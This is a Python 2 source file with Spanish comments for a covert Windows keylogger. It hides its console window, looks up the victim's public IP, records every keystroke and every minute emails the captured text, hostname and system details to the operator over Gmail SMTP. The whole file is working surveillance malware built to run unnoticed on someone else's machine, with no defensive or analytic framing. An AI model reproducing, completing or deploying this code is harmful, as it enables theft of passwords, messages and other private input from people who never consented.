# -*- coding: utf-8 -*-
# !/usr/bin/python


# librerias que usaremos
import platform
import pynput.keyboard
from urllib2 import urlopen
import time
import smtplib
import threading
import win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

# hace un intentp para obtener la ip y la usamos en el correo para que sea mas facil de identificar a los clientes
try:
    my_ip = urlopen('http://ip.42.pl/raw').read()

except:
    my_ip = "Error de ip"

# esta variable es para obtener con platform la informacion del sistema
informacion = "".join(platform.uname())
# obtenemos la hora que usaremos mas tarde
hora = int(time.strftime("%H"))
# lo mismo pero con el dia
dia = int(time.strftime("%j"))
# lo mismo pero con los minutos
minutos = int(time.strftime("%M"))
# obtenenmos la hora
f_hora = time.strftime("%X")
# aguevo
f_fecha = time.strftime("%x")

# este array es el que usaremos para guardar las teclas
teclas = []
# agregamos la fehca actual y la usaremos como mensaje para el correo
teclas.append("\n\nhora: " + f_hora + "\n" + "fecha: " + f_fecha + "\n\n")


# funcion de envio de correo que se activara como un thread
def correo():
    # wile para que cada minuto envie un correo
    while True:
        # si algo sale mal lo vuelve a intentar para que no se pieda la inforamcion
        try:
            # elejimos el tiempo de cada cuadno queremos enviar el correo
            time.sleep(60)
            # este if se usa para que si no se ha escrito nada no se envie el correo para haci no hacer mucho spam
            if len(teclas) != 1:
                # agregamos la hora actual ya que la usaremos para finalizar el mensaje y tener una guia
                teclas.append("\n\n" + "hora: " + time.strftime("%X") + "\n" + "fecha: " + time.strftime("%x") + "\n\n")
                # creamos el server de smtp
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.ehlo()
                # codificamos el envio de las cosas
                server.starttls()
                # aca ya sacamos lo que se escribio
                texto = "".join(teclas)
                # globalisamos la variable teclas para poder usarse mejor
                global teclas
                # la vaciamos para cargar otro mensaje
                teclas = []
                # agregamos otra vez la fecha
                teclas.append("\n\n" + "hora: " + time.strftime("%X") + "\n" + "fecha: " + time.strftime("%x") + "\n\n")
                # el asunto del correo que esta conformado por la ip y el nombre del usuario de la computadora
                cabeza = "{}@{}".format(my_ip, str(platform.uname()[1]))
                # este ya es el cuerpo del mensaje qeu esta en codigo utf8 para que no ocurra un error
                mensaje = "Subject:{} \nInformacion: {}\n{}".format(cabeza.encode('utf-8'), informacion.encode('utf-8'),texto.encode('utf-8'))
                # con esto nos logueamos
                server.login("correo", "contrase√±a")
                # enviamos el correo
                server.sendmail("correo", "correo", mensaje)
        except:
            # si ocurre un erro que continue
            continue


# creamos el thread
tiempo = threading.Thread(target=correo)
# lo iniciamos
tiempo.start()


# funcion que usaremos para que registre las pulsaciones
def pul(key):
    # este if comprueba si es una letra normal y la pasa tranquilamente
    if isinstance(key, pynput.keyboard.KeyCode) and key.char != None:
        teclas.append(key.char)

    # el else es para las teclas especiales
    else:
        # si es un enter que coloqeu un enter
        if str(key) == "Key.enter":
            teclas.append("\n")
        # si pone un espacio para que lo guarde como tal
        elif str(key) == "Key.space":
            teclas.append(" ")
        # este es para la teclar altgr
        elif str(key) == "<65027>":
            teclas.append("{AltGr}")

        # para el resto de teclas especiales
        else:
            teclas.append("{" + str(key) + "}")


# iniciamos la funcion que registra las tecalas
with pynput.keyboard.Listener(on_press=pul) as listen:
    listen.join()
